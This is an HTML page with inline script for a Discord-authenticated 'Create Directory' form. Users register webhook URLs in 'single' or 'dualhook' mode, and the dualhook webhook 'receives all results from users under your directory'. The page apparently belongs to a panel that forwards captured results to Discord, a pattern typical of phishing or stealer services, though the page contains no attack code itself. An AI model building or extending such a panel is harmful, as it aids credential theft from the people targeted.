<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Directory</title>
    <style>
        :root {
            --bg-dark: #0a0a0f;
            --surface-dark: #1a1a2e;
            --surface-light: rgba(45, 45, 60, 0.8);
            --text-primary: #ffffff;
            --text-secondary: #b8b8cc;
            --accent-blue: #4a90e2;
            --accent-purple: #7b68ee;
            --border-color: rgba(255, 255, 255, 0.1);
            --shadow-xl: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.4);
            --discord-blue: #5865F2;
            --discord-blue-hover: #4752C4;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-dark);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            line-height: 1.6;
        }

        /* ‚îÄ‚îÄ Auth gate (shown while checking / when not authed) ‚îÄ‚îÄ */
        .auth-gate {
            max-width: 480px;
            width: 100%;
            background: var(--surface-dark);
            border-radius: 20px;
            padding: 2.5rem 2rem;
            box-shadow: var(--shadow-xl);
            border: 1px solid var(--border-color);
            text-align: center;
        }
        .gate-icon {
            width: 60px; height: 60px;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            border-radius: 16px;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.8rem;
            margin: 0 auto 1.25rem;
            box-shadow: 0 0 30px rgba(74, 144, 226, 0.3);
        }
        .gate-title {
            font-size: 1.8rem; font-weight: 800; margin-bottom: 0.5rem;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
        }
        .gate-desc { color: var(--text-secondary); font-size: 0.95rem; margin-bottom: 2rem; }
        .discord-btn {
            display: inline-flex; align-items: center; justify-content: center; gap: 0.75rem;
            width: 100%;
            background: var(--discord-blue); color: white;
            padding: 1rem 1.5rem; border-radius: 12px; border: none;
            font-size: 1.05rem; font-weight: 700; cursor: pointer; text-decoration: none;
            transition: all 0.25s ease; font-family: inherit;
            box-shadow: 0 4px 20px rgba(88, 101, 242, 0.4);
        }
        .discord-btn:hover {
            background: var(--discord-blue-hover);
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(88, 101, 242, 0.55);
        }

        /* ‚îÄ‚îÄ Main creation form (hidden until Discord auth confirmed) ‚îÄ‚îÄ */
        .container {
            max-width: 600px; width: 100%;
            background: var(--surface-dark);
            border-radius: 20px; padding: 2rem;
            box-shadow: var(--shadow-xl); border: 1px solid var(--border-color);
            position: relative; overflow: hidden;
            display: none;
        }
        .container::before {
            content: '';
            position: absolute; top: 0; left: 0; right: 0; height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
        }
        .header { text-align: center; margin-bottom: 1.5rem; }
        .tool-icon {
            width: 60px; height: 60px;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            border-radius: 16px; display: flex; align-items: center; justify-content: center;
            font-size: 1.8rem; margin: 0 auto 1rem;
            box-shadow: 0 0 30px rgba(74, 144, 226, 0.3);
        }
        h1 {
            font-size: 2rem; font-weight: 800; margin-bottom: 0.5rem;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
        }
        .description { color: var(--text-secondary); margin-bottom: 1.5rem; font-size: 0.95rem; }

        /* Discord user badge */
        .discord-badge {
            display: inline-flex; align-items: center; gap: 0.6rem;
            background: rgba(88, 101, 242, 0.15);
            border: 1px solid rgba(88, 101, 242, 0.35);
            border-radius: 50px; padding: 0.5rem 1rem;
            font-size: 0.9rem; color: #a5b4fc;
            margin-bottom: 1.5rem;
        }
        .discord-badge img {
            width: 24px; height: 24px; border-radius: 50%; background: rgba(88,101,242,0.3);
        }
        .discord-badge .badge-name { font-weight: 600; color: #c7d2fe; }

        /* Service type tabs */
        .service-tabs {
            display: flex; gap: 0; margin-bottom: 1.5rem;
            background: var(--surface-light); border-radius: 10px; padding: 4px;
        }
        .service-tab {
            flex: 1; padding: 0.75rem; border: none; background: transparent;
            color: var(--text-secondary); border-radius: 8px; cursor: pointer;
            font-size: 0.9rem; font-weight: 600; font-family: inherit;
            transition: all 0.2s ease;
        }
        .service-tab.active {
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            color: white;
        }

        .form-group { margin-bottom: 1.5rem; }
        label {
            display: block; font-size: 1rem; color: var(--text-primary);
            margin-bottom: 0.5rem; font-weight: 600;
        }
        input {
            width: 100%; background: var(--surface-light); border: 1px solid var(--border-color);
            border-radius: 12px; padding: 1rem; font-size: 1rem; color: var(--text-primary);
            transition: all 0.3s ease; font-family: inherit;
        }
        input:focus {
            outline: none; border-color: var(--accent-blue);
            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
            background: rgba(45, 45, 60, 0.9);
        }
        input::placeholder { color: var(--text-secondary); opacity: 0.7; }
        .create-btn {
            width: 100%;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            color: white; padding: 1.25rem; border-radius: 12px; border: none;
            font-size: 1.1rem; font-weight: 700; cursor: pointer;
            transition: all 0.3s ease; margin-top: 1rem; font-family: inherit;
            box-shadow: var(--shadow-lg);
        }
        .create-btn:hover { transform: translateY(-2px); box-shadow: var(--shadow-xl), 0 0 30px rgba(74, 144, 226, 0.4); }
        .create-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

        .status-message {
            padding: 1rem; border-radius: 8px; margin-top: 1rem;
            font-size: 0.9rem; display: none;
        }
        .status-success {
            background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.3); color: #22c55e;
        }
        .status-error {
            background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); color: #ef4444;
        }
        .loading {
            display: inline-block; width: 16px; height: 16px;
            border: 2px solid var(--text-secondary); border-radius: 50%;
            border-top-color: var(--accent-blue);
            animation: spin 1s ease-in-out infinite; margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .test-section {
            margin-top: 2rem; padding: 1.5rem;
            background: var(--surface-light); border-radius: 12px; border: 1px solid var(--border-color);
        }
        .test-section h2 { font-size: 1.3rem; font-weight: 700; margin-bottom: 1rem; }
        .test-btn {
            width: 100%; background: transparent; color: var(--accent-blue);
            padding: 0.875rem; border: 1px solid var(--accent-blue);
            border-radius: 8px; font-size: 1rem; font-weight: 600;
            cursor: pointer; transition: all 0.3s ease; font-family: inherit;
        }
        .test-btn:hover { background: var(--accent-blue); color: white; transform: translateY(-1px); }
        .url-preview {
            background: var(--surface-light); border-radius: 8px; padding: 1rem;
            margin-top: 0.5rem; font-size: 0.85rem;
            color: var(--accent-blue); word-break: break-all;
        }
        small { color: var(--text-secondary); font-size: 0.85rem; margin-top: 0.5rem; display: block; }
    </style>
</head>
<body>

    <!-- Auth gate: shown while checking session or when unauthenticated -->
    <div class="auth-gate" id="authGate">
        <div class="gate-icon">üîê</div>
        <div class="gate-title">Create Directory</div>
        <p class="gate-desc">Sign in with Discord to create your personal directory. One directory per account.</p>
        <a class="discord-btn" href="/auth/discord?intent=create">
            <svg width="22" height="22" viewBox="0 0 127.14 96.36" fill="white" xmlns="http://www.w3.org/2000/svg">
                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
            </svg>
            Continue with Discord
        </a>
    </div>

    <!-- Creation form: shown after Discord auth confirmed -->
    <div class="container" id="createContainer">
        <div class="header">
            <div class="tool-icon">üõ†Ô∏è</div>
            <h1>Create Directory</h1>
            <p class="description">Set up your personal directory and webhook.</p>
            <!-- Discord badge injected here by JS -->
            <div id="discordBadge"></div>
        </div>

        <!-- Service type tabs -->
        <div class="service-tabs">
            <button type="button" class="service-tab active" data-type="single" onclick="setServiceType('single', this)">Single Hook</button>
            <button type="button" class="service-tab" data-type="dualhook" onclick="setServiceType('dualhook', this)">Dual Hook</button>
        </div>

        <form id="createForm">
            <div class="form-group">
                <label for="directoryName">Directory Name</label>
                <input
                    type="text" id="directoryName"
                    placeholder="e.g. myusername (lowercase, no spaces)"
                    required pattern="[a-z0-9-]+"
                    title="Only lowercase letters, numbers, and hyphens"
                    autocomplete="off" spellcheck="false"
                >
            </div>

            <div class="form-group" id="primaryWebhookGroup">
                <label for="webhookUrl">Your Webhook URL</label>
                <input type="url" id="webhookUrl"
                    placeholder="https://discord.com/api/webhooks/..."
                    required autocomplete="url">
            </div>

            <div class="form-group" id="dualhookWebhookGroup" style="display:none;">
                <label for="dualhookWebhookUrl">Dualhook Webhook URL</label>
                <input type="url" id="dualhookWebhookUrl"
                    placeholder="https://discord.com/api/webhooks/..."
                    autocomplete="url">
                <small>This webhook receives all results from users under your directory.</small>
            </div>

            <button type="submit" class="create-btn" id="createBtn" disabled>
                <span id="btnText">Create Directory</span>
            </button>
        </form>

        <div class="status-message" id="statusMessage"></div>

        <div class="test-section" id="testSection" style="display:none;">
            <h2>üß™ Test Your Webhook</h2>
            <button type="button" class="test-btn" id="testBtn">Test Webhook</button>
            <div id="testResult"></div>
        </div>
    </div>

    <script>
        let serviceType = 'single';
        let createdDirectory = null;
        let discordUser = null;

        // ‚îÄ‚îÄ Check for pending Discord session ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        async function checkAuth() {
            try {
                const res = await fetch('/auth/discord/pending-session');
                if (res.ok) {
                    discordUser = await res.json();
                    showCreateForm();
                } else {
                    showAuthGate();
                }
            } catch {
                showAuthGate();
            }
        }

        function showAuthGate() {
            document.getElementById('authGate').style.display = 'block';
            document.getElementById('createContainer').style.display = 'none';
        }

        function showCreateForm() {
            document.getElementById('authGate').style.display = 'none';
            document.getElementById('createContainer').style.display = 'block';

            // Render Discord badge
            if (discordUser) {
                const avatarUrl = discordUser.discordAvatar
                    ? `https://cdn.discordapp.com/avatars/${discordUser.discordId}/${discordUser.discordAvatar}.png?size=64`
                    : `https://cdn.discordapp.com/embed/avatars/0.png`;

                document.getElementById('discordBadge').innerHTML = `
                    <div class="discord-badge">
                        <img src="${avatarUrl}" alt="avatar" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
                        Signed in as <span class="badge-name">${escapeHtml(discordUser.discordUsername)}</span>
                    </div>
                `;
            }

            validateForm();
        }

        // ‚îÄ‚îÄ Service type toggle ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        function setServiceType(type, btn) {
            serviceType = type;
            document.querySelectorAll('.service-tab').forEach(t => t.classList.remove('active'));
            btn.classList.add('active');

            const isDual = type === 'dualhook';
            document.getElementById('dualhookWebhookGroup').style.display = isDual ? 'block' : 'none';
            document.getElementById('dualhookWebhookUrl').required = isDual;
            document.getElementById('primaryWebhookGroup').querySelector('label').textContent =
                isDual ? 'Your Primary Webhook URL' : 'Your Webhook URL';
            validateForm();
        }

        // ‚îÄ‚îÄ Validation ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        function validateForm() {
            const dir = document.getElementById('directoryName').value.trim();
            const wh = document.getElementById('webhookUrl').value.trim();
            const dh = document.getElementById('dualhookWebhookUrl').value.trim();
            const isDual = serviceType === 'dualhook';

            const ok = /^[a-z0-9-]+$/.test(dir) &&
                       wh.startsWith('http') &&
                       (!isDual || dh.startsWith('http'));
            document.getElementById('createBtn').disabled = !ok;
        }

        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('directoryName').addEventListener('input', validateForm);
            document.getElementById('webhookUrl').addEventListener('input', validateForm);
            document.getElementById('dualhookWebhookUrl').addEventListener('input', validateForm);
        });

        // ‚îÄ‚îÄ Status helpers ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        function showStatus(msg, type = 'success') {
            const el = document.getElementById('statusMessage');
            el.textContent = msg;
            el.className = `status-message status-${type}`;
            el.style.display = 'block';
            setTimeout(() => { el.style.display = 'none'; }, 6000);
        }

        function setLoading(isLoading) {
            const btn = document.getElementById('createBtn');
            const txt = document.getElementById('btnText');
            btn.disabled = isLoading;
            txt.innerHTML = isLoading ? '<span class="loading"></span>Creating...' : 'Create Directory';
        }

        function escapeHtml(str) {
            const d = document.createElement('div');
            d.textContent = str;
            return d.innerHTML;
        }

        // ‚îÄ‚îÄ Form submission ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('createForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                setLoading(true);

                const formData = {
                    directoryName: document.getElementById('directoryName').value.trim(),
                    webhookUrl: document.getElementById('webhookUrl').value.trim(),
                    serviceType: serviceType,
                    dualhookWebhookUrl: serviceType === 'dualhook'
                        ? document.getElementById('dualhookWebhookUrl').value.trim()
                        : null
                };

                try {
                    const res = await fetch('/api/create-directory', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(formData)
                    });

                    const result = await res.json();

                    if (result.success) {
                        showStatus('Directory created! Redirecting to your dashboard...', 'success');
                        createdDirectory = result.directoryName;

                        // Show test section
                        const urlPrefix = serviceType === 'dualhook' ? '' : 'u/';
                        const directoryUrl = `${window.location.origin}/${urlPrefix}${result.directoryName}`;
                        document.getElementById('testSection').style.display = 'block';
                        document.getElementById('testSection').innerHTML = `
                            <h2>üß™ Test Your Webhook</h2>
                            <div class="url-preview">Your directory URL: ${directoryUrl}</div>
                            <button type="button" class="test-btn" id="testBtn">Test Webhook</button>
                            <div id="testResult"></div>
                        `;
                        document.getElementById('testBtn').addEventListener('click', testWebhook);

                        // Redirect to dashboard after short delay (session cookie already set by server)
                        setTimeout(() => { window.location.href = '/dashboard'; }, 3000);
                    } else {
                        showStatus('Error: ' + result.error, 'error');
                        // If the error is "already have a directory", redirect to dashboard
                        if (res.status === 409 && result.error.includes('already has a directory')) {
                            setTimeout(() => { window.location.href = '/dashboard'; }, 2000);
                        }
                    }
                } catch (err) {
                    showStatus('Error creating directory: ' + err.message, 'error');
                } finally {
                    setLoading(false);
                }
            });
        });

        // ‚îÄ‚îÄ Webhook test ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        async function testWebhook() {
            const btn = document.getElementById('testBtn');
            const result = document.getElementById('testResult');
            if (!createdDirectory) return;
            btn.disabled = true;
            btn.textContent = 'Testing...';
            result.innerHTML = '<span class="loading"></span>Testing webhook...';
            try {
                const res = await fetch('/test-webhook', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ directoryName: createdDirectory, testMessage: 'Webhook is working' })
                });
                const data = await res.json();
                result.innerHTML = data.success
                    ? '‚úÖ Webhook test successful! Check your Discord.'
                    : '‚ùå Webhook test failed: ' + data.error;
            } catch (err) {
                result.innerHTML = '‚ùå Error: ' + err.message;
            } finally {
                btn.disabled = false;
                btn.textContent = 'Test Webhook';
            }
        }

        // ‚îÄ‚îÄ Run auth check on load ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        checkAuth();
    </script>
</body>
</html>
